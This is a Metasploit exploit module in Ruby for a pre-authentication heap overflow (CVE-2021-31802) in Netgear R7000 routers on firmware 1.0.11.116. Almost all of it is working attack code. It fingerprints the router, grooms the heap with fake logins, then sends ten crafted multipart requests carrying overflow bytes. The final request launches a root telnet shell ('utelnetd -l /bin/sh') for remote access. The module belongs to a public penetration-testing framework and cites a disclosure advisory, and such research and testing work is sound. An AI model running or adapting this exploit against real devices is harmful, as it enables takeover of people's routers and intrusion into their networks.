##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netgear R7000 backup.cgi Heap Overflow RCE',
        'Description' => %q{
          This module exploits a heap buffer overflow in the genie.cgi?backup.cgi
          page of Netgear R7000 routers running firmware version 1.0.11.116.
          Successful exploitation results in unauthenticated attackers gaining
          code execution as the root user.

          The exploit utilizes these privileges to enable the telnet server
          which allows attackers to connect to the target and execute commands
          as the admin user from within a BusyBox shell. Users can connect to
          this telnet server by running the command "telnet *target IP*".
        },
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Author' => [
          'colorlight2019', # Vulnerability Discovery and Exploit Code
          'SSD Disclosure', # Vulnerabilty Writeup
          'Grant Willcox (tekwizz123)' # Metasploit Module
        ],
        'DefaultTarget' => 0,
        'Privileged' => true,
        'Arch' => ARCH_ARMLE,
        'Targets' => [
          [ 'Netgear R7000 Firmware Version 1.0.11.116', {} ]
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SERVICE_DOWN ],
          'SideEffects' => [ CONFIG_CHANGES ]
        },
        'References' => [
          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/'],
          [ 'CVE', '2021-31802']
        ],
        'DisclosureDate' => '2021-04-21'
      )
      )

    register_options(
      [
        Opt::RPORT(80)
      ]
    )

    deregister_options('URIPATH')
  end

  def scrape(text, start_trig, end_trig)
    text[/#{start_trig}(.*?)#{end_trig}/m, 1]
  end

  def retrieve_firmware_version
    res = send_request_cgi({ 'uri' => '/currentsetting.htm' })
    if res.nil?
      return Exploit::CheckCode::Unknown('Connection timed out.')
    end

    data = res.to_s
    firmware_version = data.match(/Firmware=V(\d+\.\d+\.\d+\.\d+)(_(\d+\.\d+\.\d+))?/)
    if firmware_version.nil?
      return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')
    end

    firmware_version
  end

  def check_vuln_firmware
    firmware_version = retrieve_firmware_version
    firmware_version = Rex::Version.new(firmware_version[1])
    if firmware_version <= Rex::Version.new('1.0.11.116') || firmware_version == Rex::Version.new('1.0.11.208') || firmware_version == Rex::Version.new('1.0.11.204')
      return true
    end

    false
  end

  # Requests the login page which discloses the hardware. If it's an R7000 router, check if the firmware version is vulnerable.
  def check
    res = send_request_cgi({ 'uri' => '/' })
    if res.nil?
      return Exploit::CheckCode::Unknown('Connection timed out.')
    end

    # Checks for the `WWW-Authenticate` header in the response
    if res.headers['WWW-Authenticate']
      data = res.to_s
      marker_one = 'Basic realm="NETGEAR '
      marker_two = '"'
      model = scrape(data, marker_one, marker_two)
      print_status("Router is a NETGEAR router (#{model})")
      if model == 'R7000' && check_vuln_firmware
        return Exploit::CheckCode::Vulnerable
      end

    else
      print_error('Router is not a NETGEAR router')
    end
    return Exploit::CheckCode::Safe
  end

  def fake_logins_to_ease_heap
    # This entire set of code is dedicated towards doing a series of invalid logins, which will result in the router
    # showing a Router Password Reset page. This is needed since, as noted in SSD's blog post, the httpd program's
    # heap state is different when a user is logged in or logged out via the web management portal, and supposively
    # going through this process helps to make the heap state more clear and known.
    i = 0
    username = Rex::Text.rand_text_alphanumeric(6)
    password = Rex::Text.rand_text_alphanumeric(18)
    while (i < 3)
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => '/',
        'cookie' => 'XSRF_TOKEN=1222440606',
        'authorization' => basic_auth(username, password),
        'headers' => {
          'Connection' => 'close'
        }
      })
      if res.nil?
        return false
      elsif (res.code == 200)
        return true
      end
    end
    return false
  end

  def send_payload
    post_data = Rex::MIME::Message.new
    post_data.add_part('a', nil, nil, nil)

    post_data.bound = Rex::Text.rand_text_alphanumeric(32)

    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, "form-data; name=\"mtenRestoreCfg\"; filename=\"#{Rex::Text.rand_text_alpha(447)}\""]
    send_data = post_data.to_s
    send_data.sub!(/a\r\n--#{post_data.bound}--\r\n/, Rex::Text.rand_text_alpha(1))

    res = send_request_cgi({
      'method' => "#{Rex::Text.rand_text_alpha(58698)}POST",
      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
      'data' => send_data
    })

    if !res.nil?
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded prematurely on the first packet, something wrong happened!')
    end

    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, "form-data; name=\"mtenRestoreCfg\"; filename=\"#{Rex::Text.rand_text_alpha(439)}\""]
    send_data = post_data.to_s
    send_data.sub!(/a\r\n--#{post_data.bound}--\r\n/, Rex::Text.rand_text_alpha(1))

    res = send_request_cgi({
      'method' => "#{Rex::Text.rand_text_alpha(58706)}POST",
      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
      'data' => send_data
    })

    if !res.nil?
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded prematurely on the second packet, something wrong happened!')
    end

    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, "form-data; name=\"mtenRestoreCfg\"; filename=\"#{Rex::Text.rand_text_alpha(447)}\""]
    post_data.parts[0].content = "#{Rex::Text.rand_text_alpha(24)}\xC0\x03\x00\x00\x28\x00\x00\x00"
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, '')

    res = send_request_cgi({
      'method' => "#{Rex::Text.rand_text_alpha(58667)}POST",
      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
      'data' => send_data
    })

    if res.code != 200
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the third packet!')
    end

    post_data.parts[0].header.headers[0] = ['Content-Disposition', "form-data; name=\"StringFilepload\"; filename=\"#{Rex::Text.rand_text_alpha(256)}\""]
    post_data.parts[0].content = "\xA0\x03\x00\x00#{"\x20" * 12}#{Rex::Text.rand_text_alpha(924)}\x09\x00\x00\x00"
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, '')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/genierestore.cgi',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}" },
      'data' => send_data
    })

    if res.code != 200
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the fourth packet!')
    end

    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, "form-data; name=\"mtenRestoreCfg\"; filename=\"#{Rex::Text.rand_text_alpha(447)}\""]
    post_data.parts[0].content = ''
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, Rex::Text.rand_text_alpha(1))

    res = send_request_cgi({
      'method' => "#{Rex::Text.rand_text_alpha(58698)}POST",
      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
      'data' => send_data
    })

    if !res.nil?
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded prematurely on the fifth packet, something wrong happened!')
    end

    post_data.parts[0].header.headers[0] = ['Content-Disposition', "form-data; name=\"StringFilepload\"; filename=\"#{Rex::Text.rand_text_alpha(256)}\""]
    post_data.parts[0].content = "\x20\x00\x00\x00#{"\x20" * 12}a"
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, '')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/genierestore.cgi',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}" },
      'data' => send_data
    })

    if res.code != 200
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the sixth packet!')
    end

    post_data.parts[0].header.headers[0] = ['Content-Disposition', "form-data; name=\"StringFilepload\"; filename=\"#{Rex::Text.rand_text_alpha(256)}\""]
    post_data.parts[0].content = "\x48\x00\x00\x00#{"\x20" * 12}a"
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, '')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/genierestore.cgi',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}" },
      'data' => send_data
    })

    if res.code != 200
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the seventh packet!')
    end

    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, "form-data; name=\"mtenRestoreCfg\"; filename=\"#{Rex::Text.rand_text_alpha(439)}\""]
    post_data.parts[0].content = "#{Rex::Text.rand_text_alpha(36)}\x51\x00\x00\x00\xd8\x08\x12\x00"
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, '')

    res = send_request_cgi({
      'method' => "#{Rex::Text.rand_text_alpha(58663)}POST",
      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
      'data' => send_data
    })

    if res.code != 200
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the eighth packet!')
    end

    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, "form-data; name=\"mtenRestoreCfg\"; filename=\"#{Rex::Text.rand_text_alpha(399)}\""]
    post_data.parts[0].content = ''
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, Rex::Text.rand_text_alpha(1))

    res = send_request_cgi({
      'method' => "#{Rex::Text.rand_text_alpha(58746)}POST",
      'uri' => normalize_uri('cgi-bin', "genie.cgi?backup.cgi\nContent-Length: 4156559"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}" },
      'data' => send_data
    })

    if !res.nil?
      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded on the ninth packet!')
    end

    post_data.parts[0].header.headers[0] = ['Content-Disposition', "form-data; name=\"StringFilepload\"; filename=\"#{Rex::Text.rand_text_alpha(256)}\""]
    post_data.parts[0].content = "\x48\x00\x00\x00#{"\x20" * 12}utelnetd -l /bin/sh#{"\x00" * 45}\x04\xe8\x00\x00"
    send_data = post_data.to_s
    send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, '')

    print_status('Sending 10th and final packet...')

    send_request_cgi({
      'method' => 'POST',
      'uri' => '/genierestore.cgi',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'agent' => nil, # Disable sending the User-Agent header
      'headers' => { 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}" },
      'data' => send_data
    }, 0)

    print_status("If the exploit succeeds, you should be able to connect to the telnet shell by running: telnet #{datastore['RHOST']}")
  end

  def run
    firmware_version = retrieve_firmware_version

    firmware_version = Rex::Version.new(firmware_version[1])
    if firmware_version != Rex::Version.new('1.0.11.116')
      fail_with(Failure::NoTarget, 'Sorry but at this point in time only version 1.0.11.116 of the R7000 firmware is exploitable with this module!')
    end

    unless fake_logins_to_ease_heap # Set the heap to a more predictable state via a series of fake logins.
      fail_with(Failure::UnexpectedReply, 'The target R7000 router did not send us the expected 200 OK response after 3 invalid login attempts!')
    end

    send_payload
  end
end
